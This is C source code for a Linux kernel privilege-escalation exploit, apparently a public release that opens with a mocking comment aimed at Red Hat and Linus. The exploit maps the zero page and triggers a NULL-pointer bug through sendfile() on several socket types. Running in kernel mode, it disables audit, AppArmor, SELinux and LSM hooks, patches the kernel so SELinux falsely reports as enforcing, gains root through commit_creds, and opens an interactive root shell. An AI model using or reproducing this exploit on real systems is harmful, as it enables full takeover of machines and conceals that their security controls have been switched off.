/* dedicated to my best friend in the whole world, Robin Price
   the joke is in your hands

   just too easy -- some nice library functions for reuse here though

   credits to julien tinnes/tavis ormandy for the bug

   may want to remove the __attribute__((regparm(3))) for 2.4 kernels,
   I have no time to test

spender@www:~$ cat redhat_hehe
I bet Red Hat will wish they closed the SELinux vulnerability when they
were given the opportunity to.  Now all RHEL boxes will get owned by
leeches.c :p

fd7810e34e9856f77cba67f291ba115f33411ebd 
d4b0e413ebf15d039953dfabf7f9a2d1

thanks to Dan Walsh for the great SELinux bypass even on "fixed" SELinux 
policies

and nice work Linus on trying to silently fix an 8 year old 
vulnerability, leaving vendors without patched kernels for their users.

  use ./wunderbar_emporium.sh for everything

don't have mplayer? watch an earlier version of the exploit at:
http://www.youtube.com/watch?v=arAfIp7YzZ4

*/

#include <asm/unistd.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/personality.h>
#include <unistd.h>

#define DOMAINS_STOP -1
#define VIDEO_SIZE 4171600
#ifndef IPPROTO_SCTP
#define IPPROTO_SCTP 132
#endif
#ifndef PF_IUCV
#define PF_IUCV 32
#endif
#ifndef PX_PROTO_OL2TP
#define PX_PROTO_OL2TP 1
#endif

const int domains[][3] = { { PF_APPLETALK, SOCK_DGRAM, 0 },
	{PF_IPX, SOCK_DGRAM, 0 }, { PF_IRDA, SOCK_DGRAM, 0 },
	{PF_X25, SOCK_DGRAM, 0 }, { PF_AX25, SOCK_DGRAM, 0 },
	{PF_BLUETOOTH, SOCK_DGRAM, 0 }, { PF_IUCV, SOCK_STREAM, 0 },
	{PF_INET6, SOCK_SEQPACKET, IPPROTO_SCTP },
	{PF_PPPOX, SOCK_DGRAM, 0 },
	{PF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP },
	{DOMAINS_STOP, 0, 0 }
	};

int called_from_main = 0;
int got_ring0 = 0;
int got_root = 0;
int eightk_stack = 0;
int twofourstyle = 0;

void extract_and_play_video(void)
{
	FILE *file;
	char *buf;
 	char template[] = "/tmp/video.XXXXXX";
	char syspath[200];
	int in;

	if (called_from_main == 0)
		return;

	buf = malloc(VIDEO_SIZE);
	if (!buf)
		return;

	file = fopen("/proc/self/exe", "r");
	fseek(file, -VIDEO_SIZE, SEEK_END);
	fread(buf, VIDEO_SIZE, 1, file);
	fclose(file);

        if ((in = mkstemp(template)) < 0)
		return;

	write(in, buf, VIDEO_SIZE);
	close(in);

	snprintf(syspath, sizeof(syspath)-1, "CACA_DRIVER=ncurses mplayer -ao oss -vo caca %s", template);
	system(syspath);
	unlink(template);

	return;
}

static inline unsigned long get_current_4k(void)
{
	unsigned long current = 0;
#ifndef __x86_64__
	asm volatile (
	" movl %%esp, %0;"
	: "=r" (current)
	);
#endif
	current = *(unsigned long *)(current & 0xfffff000);
	if (current < 0xc0000000 || current > 0xfffff000)
		return 0;

	return current;
}

static inline unsigned long get_current_8k(void)
{
	unsigned long current = 0;

#ifndef __x86_64__
	asm volatile (
	" movl %%esp, %0;"
	: "=r" (current)
	);
#endif
	current &= 0xffffe000;
	eightk_stack = 1;
	if ((*(unsigned long *)current < 0xc0000000) || (*(unsigned long *)current > 0xfffff000)) {
		twofourstyle = 1;
		return current;
	}
	return *(unsigned long *)current;
}

static inline unsigned long get_current_x64(void)
{
	unsigned long current = 0;
#ifdef __x86_64__
	asm volatile (
	"movq %%gs:(0), %0"
	: "=r" (current)
	);
#endif
	return current;
}	

static unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[256];
	int ret;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL) {
			fprintf(stdout, "Unable to obtain symbol listing!\n");
			return 0;
		}
	}

	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p\n", name, (void *)addr);
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	return 0;
}

int *audit_enabled;

int *selinux_enforcing;
int *selinux_enabled;
int *sel_enforce_ptr;

int *apparmor_enabled;
int *apparmor_logsyscall;
int *apparmor_audit;
int *apparmor_complain;

unsigned long *security_ops;
unsigned long default_security_ops;

unsigned long sel_read_enforce;

int what_we_do;

unsigned int our_uid;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

static void give_it_to_me_any_way_you_can(void)
{
	if (commit_creds && prepare_kernel_cred) {
		commit_creds(prepare_kernel_cred(0));
		got_root = 1;
	} else {
		unsigned int *current;
		unsigned long orig_current;
		unsigned long orig_current_4k = 0;

		if (sizeof(unsigned long) != sizeof(unsigned int))
			orig_current = get_current_x64();
		else {
			orig_current = orig_current_4k = get_current_4k();
			if (orig_current == 0)
				orig_current = get_current_8k();
		}

repeat:
		current = (unsigned int *)orig_current;
		while (((unsigned long)current < (orig_current + 0x1000 - 17 )) &&
			(current[0] != our_uid || current[1] != our_uid ||
			 current[2] != our_uid || current[3] != our_uid))
			current++;

		if ((unsigned long)current >= (orig_current + 0x1000 - 17 )) {
			if (orig_current == orig_current_4k) {
				orig_current = get_current_8k();
				goto repeat;
			}
			return;
		}
		got_root = 1;
		memset(current, 0, sizeof(unsigned int) * 8);
	}

	return;	
}

static int __attribute__((regparm(3))) own_the_kernel(unsigned long a, unsigned long b, unsigned long c, unsigned long d, unsigned long e)
{
	got_ring0 = 1;

	if (audit_enabled)
		*audit_enabled = 0;

	// disable apparmor
	if (apparmor_enabled && *apparmor_enabled) {
		what_we_do = 1;
			*apparmor_enabled = 0;
		if (apparmor_audit)
			*apparmor_audit = 0;
		if (apparmor_logsyscall)
			*apparmor_logsyscall = 0;
		if (apparmor_complain)
			*apparmor_complain = 0;
	}

	// disable SELinux
	if (selinux_enforcing && *selinux_enforcing) {
		what_we_do = 2;
		*selinux_enforcing = 0;
	}

	if (!selinux_enabled || selinux_enabled && *selinux_enabled == 0) {
		// trash LSM
		if (default_security_ops && security_ops) {
			if (*security_ops != default_security_ops)
				what_we_do = 3;
			*security_ops = default_security_ops;
		}
	}

	/* make the idiots think selinux is enforcing */
	if (sel_read_enforce) {
		unsigned char *p;
		unsigned long _cr0;

		asm volatile (
		"mov %%cr0, %0"
		: "=r" (_cr0)
		);
		_cr0 &= ~0x10000;
		asm volatile (
		"mov %0, %%cr0"
		:
		: "r" (_cr0)
		);
		if (sizeof(unsigned int) != sizeof(unsigned long)) {
			/* 64bit version, look for the mov ecx, [rip+off]
			   and replace with mov ecx, 1
			*/
			for (p = (unsigned char *)sel_read_enforce; (unsigned long)p < (sel_read_enforce + 0x30); p++) {
				if (p[0] == 0x8b && p[1] == 0x0d) {
					p[0] = '\xb9';
					p[5] = '\x90';
					*(unsigned int *)&p[1] = 1;
				}
			}
		} else {
			/* 32bit, replace push [selinux_enforcing] with push 1 */
			for (p = (unsigned char *)sel_read_enforce; (unsigned long)p < (sel_read_enforce + 0x20); p++) {
				if (p[0] == 0xff && p[1] == 0x35) {
					// while we're at it, disable 
					// SELinux without having a 
					// symbol for selinux_enforcing ;)
					if (!selinux_enforcing) {
						sel_enforce_ptr = *(unsigned int **)&p[2];
						*sel_enforce_ptr = 0;
						what_we_do = 2;
					}
					p[0] = '\x68';
					p[5] = '\x90';
					*(unsigned int *)&p[1] = 1;
				}
			}
		}
		_cr0 |= 0x10000;
		asm volatile (
		"mov %0, %%cr0"
		:
		: "r" (_cr0)
		);
	}

	// push it real good
	give_it_to_me_any_way_you_can();

	return -1;
}

int pa__init(void *m)
{
	char *mem = NULL;
	int d;
	int ret;

	our_uid = getuid();

	if ((personality(0xffffffff)) != PER_SVR4) {
		mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
		if (mem != NULL) {
			/* for old kernels with SELinux that don't allow RWX anonymous mappings
			   luckily they don't have NX support either ;) */
			mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
			if (mem != NULL) {
				fprintf(stdout, "UNABLE TO MAP ZERO PAGE!\n");
				return 1;
			}
		}
	} else {
		ret = mprotect(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
		if (ret == -1) {
			fprintf(stdout, "UNABLE TO MPROTECT ZERO PAGE!\n");
			return 1;
		}
	}

	fprintf(stdout, " [+] MAPPED ZERO PAGE!\n");

	selinux_enforcing = (int *)get_kernel_sym("selinux_enforcing");
	selinux_enabled = (int *)get_kernel_sym("selinux_enabled");
	apparmor_enabled = (int *)get_kernel_sym("apparmor_enabled");
	apparmor_complain = (int *)get_kernel_sym("apparmor_complain");
	apparmor_audit = (int *)get_kernel_sym("apparmor_audit");
	apparmor_logsyscall = (int *)get_kernel_sym("apparmor_logsyscall");
	security_ops = (unsigned long *)get_kernel_sym("security_ops");
	default_security_ops = get_kernel_sym("default_security_ops");
	sel_read_enforce = get_kernel_sym("sel_read_enforce");
	audit_enabled = (int *)get_kernel_sym("audit_enabled");
	commit_creds = (_commit_creds)get_kernel_sym("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred");

	mem[0] = '\xff';
	mem[1] = '\x25';
	*(unsigned int *)&mem[2] = (sizeof(unsigned long) != sizeof(unsigned int)) ? 0 : 6;
	*(unsigned long *)&mem[6] = (unsigned long)&own_the_kernel;


	/* trigger it */
	{
		char template[] = "/tmp/sendfile.XXXXXX";
		int in, out;

		// Setup source descriptor
		if ((in = mkstemp(template)) < 0) {
			fprintf(stdout, "failed to open input descriptor, %m\n");
			return 1;
		}

		unlink(template);

		// Find a vulnerable domain
		d = 0;
repeat_it:
		for (; domains[d][0] != DOMAINS_STOP; d++) {
			if ((out = socket(domains[d][0], domains[d][1], domains[d][2])) >= 0)
				break;
		}
    
		if (out < 0) {
			fprintf(stdout, "unable to find a vulnerable domain, sorry\n");
			return 1;
		}

		// Truncate input file to some large value
		ftruncate(in, getpagesize());

		// sendfile() to trigger the bug.
		sendfile(out, in, NULL, getpagesize());
	}

	if (got_ring0) {
		fprintf(stdout, " [+] got ring0!\n");
	} else {
		d++;
		goto repeat_it;
	}

	fprintf(stdout, " [+] detected %s %dk stacks\n",
		twofourstyle ? "2.4 style" : "2.6 style",
		eightk_stack ? 8 : 4);
	
	extract_and_play_video();

	{
		char *msg;
		switch (what_we_do) {
			case 1:
				msg = "AppArmor";
				break;
			case 2:
				msg = "SELinux";
				break;
			case 3:
				msg = "LSM";
				break;
			default:
				msg = "nothing, what an insecure machine!";
		}
		fprintf(stdout, " [+] Disabled security of : %s\n", msg);
	}
	if (got_root == 1)
		fprintf(stdout, " [+] Got root!\n");
	else {
		fprintf(stdout, " [+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?\n");
		exit(0);
	}

	execl("/bin/sh", "/bin/sh", "-i", NULL);

	return 0;
}

void pa__done(void *m)
{
	return;
}

int main(void)
{
  called_from_main = 1;
  pa__init(NULL);
}
